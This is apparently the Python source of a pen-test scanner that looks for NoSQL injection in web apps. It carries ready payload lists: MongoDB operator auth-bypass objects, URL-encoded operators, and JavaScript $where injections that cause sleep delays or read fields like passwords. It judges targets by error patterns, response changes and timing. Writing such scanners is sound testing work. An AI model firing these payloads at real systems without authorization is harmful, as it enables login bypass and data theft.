"""
Jarwis AGI Pen Test - NoSQL Injection Scanner
Detects NoSQL Injection vulnerabilities (A03:2021 - Injection)

Based on PortSwigger Web Security Academy: https://portswigger.net/web-security/nosql-injection

Attack Techniques:
- Syntax injection (breaking queries)
- Operator injection ($ne, $gt, $regex, $where)
- JavaScript injection in $where clauses
- Authentication bypass
- Data extraction via boolean-based attacks

Supports: MongoDB, CouchDB, Redis, Elasticsearch, and other NoSQL databases.

Usage:
    scanner = NoSQLInjectionScannerV2(
        http_client=jarwis_http_client,
        request_store=request_store_db,
        checkpoint=checkpoint,
        token_manager=token_manager
    )
    findings = await scanner.run(post_login=True)
"""

import asyncio
import logging
import re
import json
from typing import Dict, List, Optional, Any, Tuple

from attacks.web.base_attack_scanner import (
    BaseAttackScanner,
    Finding,
    Severity,
    Confidence
)
from attacks.payloads.manager import PayloadManager, PayloadCategory
from core.jarwis_http_client import JarwisHTTPClient, AttackResponse
from core.request_store_db import RequestStoreDB, StoredRequest
from core.scan_checkpoint import RequestLevelCheckpoint
from core.token_manager import TokenManager

logger = logging.getLogger(__name__)


class NoSQLInjectionScannerV2(BaseAttackScanner):
    """
    NoSQL Injection Scanner (MITM-based)
    
    OWASP A03:2021 - Injection
    CWE-943: Improper Neutralization of Special Elements in Data Query Logic
    
    Attack vectors:
    - MongoDB operator injection
    - JavaScript injection in $where
    - Authentication bypass via $ne, $gt
    - Boolean-based extraction
    - Syntax injection attacks
    
    All requests go through MITM via JarwisHTTPClient.
    """
    
    # Scanner identification
    scanner_name = "nosql_injection"
    attack_type = "nosql_injection"
    owasp_category = "A03:2021"
    cwe_id = "CWE-943"
    
    # MongoDB error patterns
    MONGO_ERRORS = [
        r'MongoError',
        r'MongoDB',
        r'mongo.*exception',
        r'\$where.*requires',
        r'bad query',
        r'OperationFailure',
        r'cannot\s+be\s+applied\s+to',
        r'unrecognized\s+expression',
        r'\$or.*array',
        r'use\s+of\s+undefined\s+variable',
        r'SyntaxError.*Unexpected\s+token',
        r'Cannot\s+apply.*on\s+field',
        r'Query\s+failed',
        r'BSONObj\s+size',
        r'invalid operator',
    ]
    
    # CouchDB error patterns
    COUCHDB_ERRORS = [
        r'CouchDB',
        r'couchdb',
        r'invalid_json',
        r'bad_request',
        r'document\s+update\s+conflict',
        r'no_db_file',
        r'invalid\s+selector',
    ]
    
    # Redis error patterns
    REDIS_ERRORS = [
        r'WRONGTYPE',
        r'ERR\s+wrong',
        r'RESP',
        r'redis\.clients',
        r'Redis connection',
    ]
    
    # Elasticsearch error patterns
    ELASTIC_ERRORS = [
        r'ElasticsearchException',
        r'QueryParsingException',
        r'SearchParseException',
        r'elasticsearch',
        r'parse_exception',
        r'query_shard_exception',
    ]
    
    # =====================================================================
    # MongoDB Operator Injection Payloads
    # =====================================================================
    
    # Authentication bypass payloads (JSON body)
    AUTH_BYPASS_JSON = [
        # $ne (not equal) - always true
        {"$ne": ""},
        {"$ne": None},
        {"$ne": "invalid"},
        
        # $gt (greater than) - always true for strings
        {"$gt": ""},
        {"$gte": ""},
        
        # $regex - match all
        {"$regex": ".*"},
        {"$regex": "^.*$"},
        {"$regex": ".+"},
        
        # $in operator
        {"$in": ["admin", "administrator", "root"]},
        
        # $exists - bypass empty checks
        {"$exists": True},
        
        # $nin - not in empty array
        {"$nin": []},
        
        # Combined conditions
        {"$ne": "", "$exists": True},
    ]
    
    # URL-encoded operator injection
    AUTH_BYPASS_URL = [
        "[$ne]=",
        "[$ne]=1",
        "[$gt]=",
        "[$gte]=",
        "[$lt]=~",
        "[$regex]=.*",
        "[$exists]=true",
        "[$in][]=admin",
        "[$or][0][a][$gt]=&[$or][1][b][$gt]=",
    ]
    
    # JavaScript injection in $where clause
    JS_INJECTION_PAYLOADS = [
        # Sleep-based time detection
        "'; sleep(5000); '",
        '"; sleep(5000); "',
        "1; sleep(5000)",
        "'; return sleep(5000); '",
        
        # Boolean true conditions
        "' || '1'=='1",
        "' || 1==1 || '",
        '" || "1"=="1',
        "'; return true; '",
        '"; return true; "',
        "1 || 1==1",
        "this.a != 'invalid'",
        
        # Function call injection
        "' || this.constructor.constructor('return this')().sleep(5000) || '",
        
        # Object property access
        "'; return this.password; '",
        "'; return this; '",
        
        # Bypass with comments
        "1'--",
        "1'/*",
    ]
    
    # NoSQL syntax injection payloads
    SYNTAX_INJECTION = [
        "'",
        '"',
        '`',
        "\\",
        "{",
        "}",
        "[",
        "]",
        "$",
        "$$",
        "${",
        "{{",
        "}}",
        "'\"",
        "'}",
        '"}',
        "';",
        '";',
        # JSON breaking
        '{"$gt": ""}',
        "{'$ne': ''}",
    ]
    
    # Boolean-based extraction payloads
    BOOLEAN_PAYLOADS = [
        # Always true vs always false
        ('{"$ne": "invalid"}', '{"$eq": "impossible_value_xyz"}'),
        ('{"$gt": ""}', '{"$lt": ""}'),
        ('{"$regex": ".*"}', '{"$regex": "^impossible$"}'),
        ('{"$exists": true}', '{"$exists": false}'),
    ]
    
    # Time-based payloads (MongoDB $where with sleep)
    TIME_PAYLOADS = [
        "'; sleep({delay}000); '",
        '"; sleep({delay}000); "',
        "1; sleep({delay}000)",
        "function() { sleep({delay}000); return true; }",
    ]
    
    # High-priority parameters for NoSQL injection
    PRIORITY_PARAMS = [
        'username', 'user', 'email', 'password', 'pass', 'login', 'id',
        'uid', 'userId', 'user_id', 'token', 'query', 'search', 'filter',
        'where', 'find', 'select', 'match', 'criteria', 'condition',
        'name', 'key', 'value', 'data', 'json', 'document', 'collection'
    ]
    
    def __init__(
        self,
        http_client: JarwisHTTPClient,
        request_store: RequestStoreDB,
        checkpoint: Optional[RequestLevelCheckpoint] = None,
        token_manager: Optional[TokenManager] = None,
        config: Optional[Dict[str, Any]] = None
    ):
        super().__init__(http_client, request_store, checkpoint, token_manager, config)
        self._delay_seconds = config.get('delay_seconds', 5) if config else 5
        
        # Initialize PayloadManager for external payload loading
        self._payload_manager = PayloadManager()
        self._external_payloads_loaded = False
        self._ext_operators: List[str] = []
        self._ext_url_encoded: List[str] = []
        self._ext_javascript: List[str] = []
        self._ext_syntax: List[str] = []
    
    def _load_external_payloads(self) -> None:
        """Lazy-load payloads from external files."""
        if self._external_payloads_loaded:
            return
        
        try:
            self._ext_operators = self._payload_manager.get_payloads(
                PayloadCategory.NOSQL, subcategory="operators", limit=50
            )
            self._ext_url_encoded = self._payload_manager.get_payloads(
                PayloadCategory.NOSQL, subcategory="url_encoded", limit=30
            )
            self._ext_javascript = self._payload_manager.get_payloads(
                PayloadCategory.NOSQL, subcategory="javascript", limit=30
            )
            self._ext_syntax = self._payload_manager.get_payloads(
                PayloadCategory.NOSQL, subcategory="syntax", limit=40
            )
            self._external_payloads_loaded = True
            logger.debug(f"Loaded NoSQL payloads from external files")
        except Exception as e:
            logger.warning(f"Failed to load external NoSQL payloads, using embedded: {e}")
    
    def get_payloads(self) -> List[str]:
        """Return syntax injection payloads for quick testing. Uses external payloads if available."""
        self._load_external_payloads()
        
        # Prefer external payloads, fall back to embedded
        if self._ext_syntax:
            return self._ext_syntax[:self.max_payloads_per_param]
        return self.SYNTAX_INJECTION[:self.max_payloads_per_param]
    
    def get_url_encoded_payloads(self) -> List[str]:
        """Return URL-encoded operator payloads."""
        self._load_external_payloads()
        if self._ext_url_encoded:
            return self._ext_url_encoded[:30]
        return self.AUTH_BYPASS_URL
    
    def get_javascript_payloads(self) -> List[str]:
        """Return JavaScript injection payloads for $where."""
        self._load_external_payloads()
        if self._ext_javascript:
            return [p.replace('{delay}', str(self._delay_seconds)) for p in self._ext_javascript[:30]]
        return self.JS_INJECTION_PAYLOADS
    
    def is_applicable(self, request: StoredRequest) -> bool:
        """Check if this request should be tested for NoSQL injection."""
        # Skip static resources
        if request.endpoint_type == 'static':
            return False
        
        # Must have parameters
        if not request.parameters:
            return False
        
        # Check for JSON content type (common for NoSQL APIs)
        content_type = request.content_type or ''
        is_json_request = 'application/json' in content_type.lower()
        
        # Prioritize JSON requests and requests with priority parameters
        param_names = [p.lower() for p in request.parameters.keys()]
        has_priority_param = any(p in ' '.join(param_names) for p in self.PRIORITY_PARAMS)
        
        # Test if it's a JSON API, has login-related params, or is dynamic
        return is_json_request or has_priority_param or request.endpoint_type == 'dynamic'
    
    async def scan_request(self, request: StoredRequest) -> List[Finding]:
        """
        Scan a single request for NoSQL injection vulnerabilities.
        
        Attack methodology:
        1. Get baseline response
        2. Test syntax injection for error-based detection
        3. Test operator injection ($ne, $gt, $regex)
        4. Test JavaScript injection in $where
        5. Test boolean-based extraction
        6. Test time-based blind injection
        """
        findings = []
        
        # Get baseline response
        baseline = await self.send_baseline_request(request)
        if not baseline:
            logger.warning(f"[{self.scanner_name}] Could not get baseline for {request.url}")
            return findings
        
        baseline_time_ms = baseline.response_time_ms
        content_type = request.content_type or ''
        is_json = 'application/json' in content_type.lower()
        
        # Test each parameter
        for param_name, param_value in request.parameters.items():
            if self._cancelled:
                break
            
            # Determine injection locations
            locations = self._get_injection_locations(request, param_name)
            
            for location in locations:
                # 1. Syntax injection (error-based)
                syntax_finding = await self._test_syntax_injection(
                    request, param_name, location, baseline
                )
                if syntax_finding:
                    findings.append(syntax_finding)
                    continue
                
                # 2. Operator injection ($ne, $gt, etc.)
                operator_finding = await self._test_operator_injection(
                    request, param_name, location, baseline, is_json
                )
                if operator_finding:
                    findings.append(operator_finding)
                    continue
                
                # 3. JavaScript injection ($where)
                js_finding = await self._test_js_injection(
                    request, param_name, location, baseline
                )
                if js_finding:
                    findings.append(js_finding)
                    continue
                
                # 4. Boolean-based blind
                boolean_finding = await self._test_boolean_based(
                    request, param_name, location, baseline, is_json
                )
                if boolean_finding:
                    findings.append(boolean_finding)
                    continue
                
                # 5. Time-based blind
                time_finding = await self._test_time_based(
                    request, param_name, location, baseline_time_ms
                )
                if time_finding:
                    findings.append(time_finding)
        
        return findings
    
    def _get_injection_locations(
        self,
        request: StoredRequest,
        param_name: str
    ) -> List[str]:
        """Determine where to inject payloads."""
        locations = []
        
        if '?' in request.url and param_name in request.url:
            locations.append('query')
        
        if request.body and param_name in request.body:
            locations.append('body')
        
        if not locations:
            if request.method.upper() in ('POST', 'PUT', 'PATCH'):
                locations.append('body')
            else:
                locations.append('query')
        
        return locations
    
    async def _test_syntax_injection(
        self,
        request: StoredRequest,
        param_name: str,
        location: str,
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test for syntax injection that triggers NoSQL errors."""
        
        for payload in self.SYNTAX_INJECTION[:self.max_payloads_per_param]:
            response = await self.send_payload(
                request=request,
                payload=payload,
                location=location,
                parameter_name=param_name
            )
            
            if not response:
                continue
            
            is_vulnerable, evidence, confidence = self.detect_vulnerability(
                response, payload, baseline
            )
            
            if is_vulnerable:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    evidence=evidence,
                    confidence=confidence,
                    severity="high",
                    title=f"NoSQL Syntax Injection in '{param_name}'",
                    description=(
                        f"The parameter '{param_name}' is vulnerable to NoSQL syntax injection. "
                        f"Special characters in input cause database query errors, indicating "
                        f"user input is directly interpolated into NoSQL queries."
                    ),
                    parameter=param_name
                )
        
        return None
    
    async def _test_operator_injection(
        self,
        request: StoredRequest,
        param_name: str,
        location: str,
        baseline: AttackResponse,
        is_json: bool
    ) -> Optional[Finding]:
        """Test MongoDB operator injection ($ne, $gt, $regex, etc.)."""
        
        if is_json and location == 'body':
            # Test JSON operator injection
            for operator_payload in self.AUTH_BYPASS_JSON[:5]:
                # Reconstruct body with operator payload
                modified_body = self._inject_operator_json(
                    request.body, param_name, operator_payload
                )
                
                if not modified_body:
                    continue
                
                response = await self.http_client.send_attack(
                    url=request.url,
                    method=request.method,
                    headers=request.headers,
                    body=modified_body,
                    scanner_name=self.scanner_name,
                    attack_type=self.attack_type,
                    original_request_id=request.id,
                    payload=json.dumps(operator_payload),
                    payload_location=location,
                    parameter_name=param_name
                )
                
                if not response or not response[0]:
                    continue
                
                response = response[0]
                
                # Check for successful bypass (different response than baseline)
                if self._is_auth_bypass(response, baseline):
                    return self.create_finding(
                        request=request,
                        response=response,
                        payload=json.dumps(operator_payload),
                        evidence=f"Operator injection successful. Response changed indicating bypass.",
                        confidence="high",
                        severity="critical",
                        title=f"NoSQL Operator Injection in '{param_name}'",
                        description=(
                            f"The parameter '{param_name}' is vulnerable to MongoDB operator injection. "
                            f"The {list(operator_payload.keys())[0]} operator can bypass authentication "
                            f"or extract data by manipulating query conditions."
                        ),
                        parameter=param_name
                    )
        else:
            # Test URL-encoded operator injection
            for payload in self.AUTH_BYPASS_URL[:5]:
                # Construct URL-encoded operator payload
                full_payload = f"{param_name}{payload}"
                
                response = await self.send_payload(
                    request=request,
                    payload=full_payload,
                    location=location,
                    parameter_name=param_name
                )
                
                if not response:
                    continue
                
                if self._is_auth_bypass(response, baseline):
                    return self.create_finding(
                        request=request,
                        response=response,
                        payload=full_payload,
                        evidence=f"URL operator injection successful. Response indicates bypass.",
                        confidence="high",
                        severity="critical",
                        title=f"NoSQL Operator Injection (URL) in '{param_name}'",
                        description=(
                            f"The parameter '{param_name}' is vulnerable to NoSQL operator injection "
                            f"via URL-encoded operators. This can bypass authentication checks."
                        ),
                        parameter=param_name
                    )
        
        return None
    
    async def _test_js_injection(
        self,
        request: StoredRequest,
        param_name: str,
        location: str,
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test JavaScript injection in $where clause."""
        
        for payload in self.JS_INJECTION_PAYLOADS[:self.max_payloads_per_param]:
            response = await self.send_payload(
                request=request,
                payload=payload,
                location=location,
                parameter_name=param_name
            )
            
            if not response:
                continue
            
            # Check for different response indicating injection worked
            if self._responses_differ_significantly(response, baseline):
                # Verify it's not just an error
                is_error, _, _ = self.detect_vulnerability(response, payload, baseline)
                
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    evidence=f"JavaScript injection in $where clause. Response changed significantly.",
                    confidence="high" if not is_error else "medium",
                    severity="critical",
                    title=f"NoSQL JavaScript Injection in '{param_name}'",
                    description=(
                        f"The parameter '{param_name}' is vulnerable to JavaScript injection "
                        f"in MongoDB's $where clause. This allows executing arbitrary JavaScript "
                        f"on the database server, potentially leading to data extraction or DoS."
                    ),
                    parameter=param_name
                )
        
        return None
    
    async def _test_boolean_based(
        self,
        request: StoredRequest,
        param_name: str,
        location: str,
        baseline: AttackResponse,
        is_json: bool
    ) -> Optional[Finding]:
        """Test boolean-based blind NoSQL injection."""
        
        for true_payload, false_payload in self.BOOLEAN_PAYLOADS[:3]:
            # Send true condition
            if is_json and location == 'body':
                true_body = self._inject_operator_json(
                    request.body, param_name, json.loads(true_payload)
                )
                false_body = self._inject_operator_json(
                    request.body, param_name, json.loads(false_payload)
                )
                
                if not true_body or not false_body:
                    continue
                
                true_resp, _ = await self.http_client.send_attack(
                    url=request.url,
                    method=request.method,
                    headers=request.headers,
                    body=true_body,
                    scanner_name=self.scanner_name,
                    attack_type=self.attack_type,
                    original_request_id=request.id
                )
                
                await asyncio.sleep(0.2)
                
                false_resp, _ = await self.http_client.send_attack(
                    url=request.url,
                    method=request.method,
                    headers=request.headers,
                    body=false_body,
                    scanner_name=self.scanner_name,
                    attack_type=self.attack_type,
                    original_request_id=request.id
                )
            else:
                true_resp = await self.send_payload(
                    request=request,
                    payload=true_payload,
                    location=location,
                    parameter_name=param_name
                )
                
                await asyncio.sleep(0.2)
                
                false_resp = await self.send_payload(
                    request=request,
                    payload=false_payload,
                    location=location,
                    parameter_name=param_name
                )
            
            if not true_resp or not false_resp:
                continue
            
            # Compare responses
            if self._responses_differ_significantly(true_resp, false_resp):
                evidence = (
                    f"True condition: {true_resp.status_code}, {len(true_resp.body or '')} bytes. "
                    f"False condition: {false_resp.status_code}, {len(false_resp.body or '')} bytes."
                )
                
                return self.create_finding(
                    request=request,
                    response=true_resp,
                    payload=true_payload,
                    evidence=evidence,
                    confidence="high",
                    severity="high",
                    title=f"Boolean-based Blind NoSQL Injection in '{param_name}'",
                    description=(
                        f"The parameter '{param_name}' shows different responses based on "
                        f"injected NoSQL boolean conditions. This confirms the ability to "
                        f"manipulate query logic and potentially extract data bit by bit."
                    ),
                    parameter=param_name
                )
        
        return None
    
    async def _test_time_based(
        self,
        request: StoredRequest,
        param_name: str,
        location: str,
        baseline_time_ms: float
    ) -> Optional[Finding]:
        """Test time-based blind NoSQL injection (MongoDB $where sleep)."""
        
        delay = self._delay_seconds
        
        for payload_template in self.TIME_PAYLOADS[:3]:
            payload = payload_template.format(delay=delay)
            
            response = await self.send_payload(
                request=request,
                payload=payload,
                location=location,
                parameter_name=param_name
            )
            
            if not response:
                continue
            
            # Check for time delay
            if self.check_time_based(response, baseline_time_ms, float(delay)):
                evidence = (
                    f"Baseline: {baseline_time_ms:.0f}ms. "
                    f"With sleep: {response.response_time_ms:.0f}ms. "
                    f"Expected delay: {delay * 1000}ms."
                )
                
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    evidence=evidence,
                    confidence="confirmed",
                    severity="critical",
                    title=f"Time-based Blind NoSQL Injection in '{param_name}'",
                    description=(
                        f"The parameter '{param_name}' is vulnerable to time-based blind "
                        f"NoSQL injection. The MongoDB sleep() function caused a {delay}s delay, "
                        f"confirming JavaScript execution in $where clause."
                    ),
                    parameter=param_name
                )
        
        return None
    
    def _inject_operator_json(
        self,
        body: str,
        param_name: str,
        operator_payload: dict
    ) -> Optional[str]:
        """Inject operator payload into JSON body."""
        try:
            data = json.loads(body) if body else {}
            data[param_name] = operator_payload
            return json.dumps(data)
        except Exception:
            return None
    
    def _is_auth_bypass(
        self,
        response: AttackResponse,
        baseline: AttackResponse
    ) -> bool:
        """Check if response indicates authentication bypass."""
        # Different status code (200 vs 401/403)
        if response.status_code == 200 and baseline.status_code in (401, 403):
            return True
        
        # Significant response size change
        resp_len = len(response.body or '')
        base_len = len(baseline.body or '')
        
        if resp_len > base_len * 2:
            return True
        
        # Look for success indicators
        success_patterns = [
            r'welcome', r'dashboard', r'logged\s*in', r'success',
            r'authenticated', r'token', r'session', r'user.*info'
        ]
        
        body = (response.body or '').lower()
        base_body = (baseline.body or '').lower()
        
        for pattern in success_patterns:
            if re.search(pattern, body) and not re.search(pattern, base_body):
                return True
        
        return False
    
    def _responses_differ_significantly(
        self,
        resp1: AttackResponse,
        resp2: AttackResponse
    ) -> bool:
        """Check if two responses differ significantly."""
        # Different status codes
        if resp1.status_code != resp2.status_code:
            return True
        
        len1 = len(resp1.body or '')
        len2 = len(resp2.body or '')
        
        if len1 == 0 or len2 == 0:
            return len1 != len2
        
        # >10% size difference
        diff_ratio = abs(len1 - len2) / max(len1, len2)
        if diff_ratio > 0.1:
            return True
        
        return False
    
    def detect_vulnerability(
        self,
        response: AttackResponse,
        payload: str,
        original_response: Optional[AttackResponse] = None
    ) -> Tuple[bool, str, str]:
        """Analyze response for NoSQL injection indicators."""
        if not response.body:
            return False, "", ""
        
        body = response.body
        
        # Check for MongoDB errors
        for pattern in self.MONGO_ERRORS:
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                return True, f"MongoDB error: {match.group(0)[:100]}", "confirmed"
        
        # Check for CouchDB errors
        for pattern in self.COUCHDB_ERRORS:
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                return True, f"CouchDB error: {match.group(0)[:100]}", "confirmed"
        
        # Check for Redis errors
        for pattern in self.REDIS_ERRORS:
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                return True, f"Redis error: {match.group(0)[:100]}", "high"
        
        # Check for Elasticsearch errors
        for pattern in self.ELASTIC_ERRORS:
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                return True, f"Elasticsearch error: {match.group(0)[:100]}", "high"
        
        return False, "", ""


# Alias for backward compatibility
NoSQLInjectionScanner = NoSQLInjectionScannerV2
